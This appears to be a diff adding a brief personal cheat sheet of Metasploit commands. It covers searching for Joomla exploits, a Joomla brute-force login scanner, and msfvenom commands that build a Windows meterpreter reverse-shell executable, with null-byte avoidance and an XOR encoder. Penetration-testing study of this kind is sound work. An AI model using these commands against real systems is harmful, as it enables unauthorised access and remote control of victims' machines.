@@ -1,0 +1,31 @@
+
+---------------------
+
+     METASPLOIT
+
+---------------------
+
+
+1)
+
+- "msfconsole"
+- "search joomla" find all joomla exploits
+- "use <exploit>" set the exploit you want to use
+- "use auxiliary/scanner/http/joomla_bruteforce_login"
+
+- "set RHOST 1.1.1.1" set remotehost 
+
+2) 
+
+https://www.offensive-security.com/metasploit-unleashed/generating-payloads/
+
+- "msfconsole"
+- msfvenom -p [PAYLOAD/OPTION/HERE] -e [ENCODER/HERE] -f [FORMAT]]
+- "help"
+- "msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.21.1.1 lport=443 -f exe -o shell.exe"
+- "msfvenom -p windows/x64/shell_reverse_tcp"
+- "generate -b '\x00'" generate this payload with no null bytes
+
+https://securitytutorials.co.uk/creating-a-payload-with-msfvenom/
+
+- use encoded "x86/countdown" for single byte XOR countdown
